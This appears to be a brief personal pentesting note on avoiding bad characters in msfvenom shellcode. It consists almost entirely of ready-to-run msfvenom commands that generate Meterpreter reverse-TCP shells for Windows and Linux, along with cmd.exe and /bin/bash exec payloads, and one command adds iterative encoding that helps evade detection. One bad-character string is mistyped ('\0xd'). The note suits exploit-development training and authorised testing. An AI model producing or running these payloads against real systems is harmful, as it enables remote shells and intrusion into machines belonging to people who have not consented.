# Bad Characters

- When removing bad characters `msfvenom` will warn you by throwing an error that in case if the shellcode have problems try to use with [[Encoders|enoders]] to get around it. Here are the some specific payloads that I've played around with and this is the result I get:

`$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x00\xff\x0a\x0d" -f c > payload-x86.c`

`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x00\x0a\x0d" -f c > payload-x64.c`

`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x0a\x0d" -e x64/zutto_dekiru -i 9 -f c > payload-x64-enc.c`

`$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x00\xff\x0a\x0d" -f c > payload-x86.c`

`$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -b "\x00\x0a\x0d" -f c > payload-x64.c`

`$ msfvenom -p windows/x64/exec cmd=cmd.exe -b "\x00\x0a\0xd" -f c > payload-x64.c`

`$ msfvenom -p linux/x64/exec cmd=/bin/bash -b "\x00\x0a\x0d" -f c > payload-x64.c`